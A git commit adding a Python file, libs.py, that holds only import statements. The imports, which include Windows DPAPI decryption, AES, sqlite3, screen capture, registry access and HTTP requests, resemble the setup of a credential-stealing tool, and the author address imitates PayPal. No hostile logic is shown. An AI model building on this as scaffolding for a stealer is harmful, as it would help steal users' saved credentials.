230e400ef844fb9d7704ab3c6791a83a0f7d8736
sdifru877234 <paypalcustomermails@gmail.com>
2024-07-20 03:39:51 +0100

    Add files via upload

---
+++ libs.py
@@ -0,0 +1,32 @@
+import requests
+import os
+import subprocess
+import winreg
+import winreg as reg
+import shutil
+import json
+import zipfile
+import io
+import psutil
+import platform
+import threading
+import time
+import sys
+import socket
+import ctypes
+import uuid
+import wmi
+import re
+import base64
+import sqlite3
+
+from datetime           import datetime
+from base64             import b64decode
+from Crypto.Cipher      import AES
+from win32crypt         import CryptUnprotectData
+from os                 import getlogin, listdir, getenv
+from json               import loads
+from re                 import findall
+from urllib.request     import Request, urlopen
+from subprocess         import Popen, PIPE
+from PIL                import ImageGrab
